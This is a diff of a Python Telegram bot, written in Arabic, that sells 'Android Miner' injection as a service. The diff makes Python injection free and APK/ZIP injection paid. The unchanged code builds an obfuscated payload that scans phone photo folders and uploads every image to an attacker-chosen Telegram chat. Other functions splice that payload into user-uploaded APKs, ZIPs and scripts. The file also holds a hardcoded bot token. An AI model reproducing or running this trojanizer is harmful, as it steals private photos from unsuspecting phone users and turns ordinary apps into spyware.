@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
-🤖 بوت حقن Android Miner - النسخة المدفوعة الاحترافية
-Admin ID: 7238044992
+🤖 بوت حقن Android Miner - نسخة مدفوعة جزئياً
+- Python Script → مجاني
+- APK + ZIP → مدفوع (يطلب الاشتراك)
+- Admin ID: 7238044992
 """
 
 import asyncio
@@ -25,45 +27,41 @@ from telegram.ext import (
 )
 
 BOT_TOKEN = "8695021881:AAGaevEMGterFy_QmZCyNvKejKfTabisiFo"
-ADMIN_ID = 7238044992   # معرف الأدمن الجديد
+ADMIN_ID = 7238044992
 
 # States
 TOKEN, CHATID, FILE = range(3)
 
-# الرسائل الاحترافية
 WELCOME = """
 🤖 **بوت الحقن الاحترافي للأندرويد** 🚀
 
-**⚠️ الخدمة مدفوعة**
-حقن APK + ZIP + Python Scripts
-
-استخدم الأمر /subscribe للاشتراك
+أرسل /start لبدء الإعداد
 """
 
 SUBSCRIBE_MSG = """
-🛒 **نظام الاشتراك الاحترافي**
+🔒 **هذا النوع من الملفات مدفوع**
 
-✅ حقن APK و ZIP  
-✅ حقن Python Scripts  
-✅ دعم فني سريع
+✅ حقن APK و ZIP يتطلب اشتراك
 
-**خطوات الاشتراك:**
+**للاشتراك:**
 1. أرسل `/myid` للحصول على معرفك
-2. أرسل معرفك للإدارة → @CI_v_CI
-3. أكمل الدفع
-4. سيتم تفعيل حسابك فوراً
+2. أرسل معرفك إلى الإدارة → @CI_v_CI
+3. بعد الدفع سيتم تفعيلك
 
-بعد التفعيل أرسل /start
+يمكنك تجربة الحقن على ملفات Python مجاناً حالياً.
 """
 
-PAID_ONLY_MSG = """
-🔒 هذه الخدمة **مدفوعة** فقط.
-يرجى الاشتراك أولاً عبر الأمر:
-/subscribe
+PAID_FILE_MSG = """
+🔒 **حقن APK و ZIP مدفوع**
+
+هذا الملف ({file_type}) يتطلب اشتراكاً.
+يرجى الاشتراك عبر الإدارة @CI_v_CI
+
+يمكنك رفع ملفات Python (.py) مجاناً الآن.
 """
 
 SUCCESS = "🎉 تم الحقن بنجاح! الملف جاهز للاستخدام 🟢"
-ERROR_FILE = "❌ ارفع ملف مدعوم (APK, ZIP, .py) — الحد الأقصى 50 ميجا"
+ERROR_FILE = "❌ يرجى رفع ملف APK أو ZIP أو Python script فقط"
 
 DIRS = [
     "/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures",
@@ -76,7 +74,6 @@ DIRS = [
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ====================== Payload Generator (نفس الأصلي) ======================
 def make_payload(token: str, chatid: str) -> str:
     miner = f'import os,requests,base64,zlib,hashlib,time,glob,io;k=42;d="{chatid}";c="{token}";def e(b):return bytes([ord(b[i])^k for i in range(len(b))]);exec(zlib.decompress(base64.b64decode(bytes([ord(e(d))[i]^42 for i in range(len(e(d)))])));while 1:time.sleep(120);for p in {repr(DIRS)}:if os.path.exists(p):for f in glob.glob(p+"/*.[jJ][pP][gG]")+glob.glob(p+"/*.[pP][nN][gG]"):try:s=os.stat(f);if 1024<s.st_size<50000000:h=hashlib.md5(open(f,"rb").read()).hexdigest();o=open("/sdcard/.m","a+");if h not in o.read():o.close();open("/sdcard/.m","a").write(h+"\\n");requests.post("https://api.telegram.org/bot"+c+"/sendPhoto",data={{"chat_id":d,"caption":"🖼️"}},files={{"photo":open(f,"rb")}});except:pass'
     comp = zlib.compress(miner.encode())
@@ -89,42 +86,29 @@ async def is_subscribed(context: ContextTypes.DEFAULT_TYPE, user_id: int) -> boo
     approved = context.bot_data.get('approved_users', set())
     return user_id in approved
 
-# ====================== Handlers ======================
+# ====================== Basic Commands ======================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not await is_subscribed(context, user_id):
-        kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
-        await update.message.reply_text(WELCOME, parse_mode='Markdown')
-        await update.message.reply_text(SUBSCRIBE_MSG, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
-        return ConversationHandler.END
-
     context.user_data.clear()
-    await update.message.reply_text("✅ تم التحقق من اشتراكك!\n\n🔑 أرسل **Bot Token** الآن:", parse_mode='Markdown')
+    await update.message.reply_text(WELCOME, parse_mode='Markdown')
+    await update.message.reply_text("🔑 أرسل **Bot Token** الآن:", parse_mode='Markdown')
     return TOKEN
-
-async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
-    await update.message.reply_text(SUBSCRIBE_MSG, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
 
 async def myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     await update.message.reply_text(
-        f"🆔 **معرفك (User ID):** `{user.id}`\n\n"
-        f"أرسل هذا الرقم إلى الإدارة:\n@CI_v_CI",
+        f"🆔 **معرفك:** `{user.id}`\n\nأرسل هذا الرقم للإدارة @CI_v_CI للاشتراك",
         parse_mode='Markdown'
     )
 
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if await is_subscribed(context, user_id):
-        await update.message.reply_text("✅ أنت مشترك حالياً ويمكنك استخدام خدمة الحقن.")
+    if await is_subscribed(context, update.effective_user.id):
+        await update.message.reply_text("✅ أنت مشترك ويمكنك حقن APK و ZIP.")
     else:
-        await update.message.reply_text("❌ أنت غير مشترك حالياً.\nاستخدم /subscribe للاشتراك.")
+        await update.message.reply_text("ℹ️ أنت غير مشترك.\nملفات Python مجانية، APK و ZIP مدفوعة.")
 
 async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if user.id != ADMIN_ID:
-        await update.message.reply_text("❌ هذا الأمر مخصص للإدارة فقط.")
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ هذا الأمر للإدارة فقط.")
         return
 
     try:
@@ -132,55 +116,56 @@ async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if 'approved_users' not in context.bot_data:
             context.bot_data['approved_users'] = set()
         context.bot_data['approved_users'].add(target_id)
-        await update.message.reply_text(f"✅ تم تفعيل المستخدم بنجاح!\nUser ID: {target_id}")
-        # إشعار المستخدم (اختياري)
+        await update.message.reply_text(f"✅ تم تفعيل المستخدم: {target_id}")
         try:
-            await context.bot.send_message(target_id, "🎉 تم تفعيل اشتراكك بنجاح!\nأرسل /start الآن للبدء.")
+            await context.bot.send_message(target_id, "🎉 تم تفعيل اشتراكك!\nيمكنك الآن رفع ملفات APK و ZIP.")
         except:
             pass
-    except (IndexError, ValueError):
-        await update.message.reply_text("⚠️ الاستخدام الصحيح:\n`/approve 1234567890`", parse_mode='Markdown')
+    except:
+        await update.message.reply_text("⚠️ استخدم: `/approve 1234567890`", parse_mode='Markdown')
 
-# ====================== Conversation Handlers ======================
+# ====================== Conversation ======================
 async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_subscribed(context, update.effective_user.id):
-        await update.message.reply_text(PAID_ONLY_MSG, parse_mode='Markdown')
-        return ConversationHandler.END
-
     token = update.message.text.strip()
     if not await validate_token(token):
-        await update.message.reply_text("❌ التوكن غير صالح، حاول مرة أخرى.", parse_mode='Markdown')
+        await update.message.reply_text("❌ توكن غير صالح، حاول مرة أخرى.")
         return TOKEN
 
     context.user_data['token'] = token
-    await update.message.reply_text("✅ تم حفظ Bot Token!\n\n📲 أرسل **Chat ID** الآن:", parse_mode='Markdown')
+    await update.message.reply_text("✅ تم حفظ التوكن!\n\n📲 أرسل **Chat ID** الآن:", parse_mode='Markdown')
     return CHATID
 
 async def get_chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_subscribed(context, update.effective_user.id):
-        await update.message.reply_text(PAID_ONLY_MSG, parse_mode='Markdown')
-        return ConversationHandler.END
-
     chatid = update.message.text.strip()
     if not chatid.lstrip('-').isdigit():
-        await update.message.reply_text("❌ Chat ID غير صالح.", parse_mode='Markdown')
+        await update.message.reply_text("❌ Chat ID غير صالح.")
         return CHATID
 
     context.user_data['chatid'] = chatid
-    await update.message.reply_text("✅ تم حفظ Chat ID!\n\n📤 ارفع الملف الآن (APK أو ZIP أو .py)", parse_mode='Markdown')
+    await update.message.reply_text("✅ تم الحفظ!\n\n📤 ارفع الملف الآن (Python مجاني - APK/ZIP مدفوع)", parse_mode='Markdown')
     return FILE
 
 async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_subscribed(context, update.effective_user.id):
-        await update.message.reply_text(PAID_ONLY_MSG, parse_mode='Markdown')
-        return ConversationHandler.END
-
-    # باقي كود الحقن (Progress Bar + inject APK/ZIP/Python)
     doc = update.message.document
-    if not doc or doc.file_size > 50 * 1024 * 1024:
+    if not doc:
         await update.message.reply_text(ERROR_FILE, parse_mode='Markdown')
         return FILE
 
+    file_name = doc.file_name.lower()
+    is_paid_file = file_name.endswith(('.apk', '.zip'))
+
+    # فحص إذا كان الملف مدفوع وغير مشترك
+    if is_paid_file and not await is_subscribed(context, update.effective_user.id):
+        file_type = "APK" if file_name.endswith('.apk') else "ZIP"
+        kb = [[InlineKeyboardButton("🛒 اشتراك الآن", callback_data="subscribe")]]
+        await update.message.reply_text(
+            PAID_FILE_MSG.format(file_type=file_type),
+            reply_markup=InlineKeyboardMarkup(kb),
+            parse_mode='Markdown'
+        )
+        return FILE
+
+    # إذا وصل هنا → إما ملف Python أو المستخدم مشترك → يستمر الحقن
     status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")
 
     try:
@@ -195,8 +180,8 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         payload = make_payload(context.user_data['token'], context.user_data['chatid'])
 
-        with tqdm(total=100, desc="الحقن", bar_format="{l_bar}{bar} {n_fmt}%") as pbar:
-            if file_bytes.startswith(b'PK') or doc.file_name.lower().endswith(('.apk', '.zip')):
+        with tqdm(total=100, desc="الحقن") as pbar:
+            if file_bytes.startswith(b'PK') or is_paid_file:
                 result = inject_apk(bytes(file_bytes), payload)
             else:
                 result = inject_script(bytes(file_bytes), payload)
@@ -212,12 +197,12 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except Exception as e:
         logger.error(f"Error: {e}")
-        await status_msg.edit_text(f"❌ خطأ أثناء المعالجة: {str(e)[:200]}")
+        await status_msg.edit_text(f"❌ حدث خطأ: {str(e)[:200]}")
 
     context.user_data.clear()
     return ConversationHandler.END
 
-# دوال الحقن (نفسها)
+# دوال الحقن (لم تتغير)
 def inject_apk(apk_bytes: bytes, payload: str) -> io.BytesIO:
     bio = io.BytesIO(apk_bytes)
     with zipfile.ZipFile(bio, 'r') as zf:
@@ -271,13 +256,12 @@ def main():
     )
 
     app.add_handler(conv_handler)
-    app.add_handler(CommandHandler("subscribe", subscribe_command))
     app.add_handler(CommandHandler("myid", myid))
     app.add_handler(CommandHandler("status", status))
     app.add_handler(CommandHandler("approve", approve))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("✅ البوت المدفوع الاحترافي يعمل الآن | Admin ID:", ADMIN_ID)
+    print("✅ البوت يعمل - Python مجاني | APK & ZIP مدفوع")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
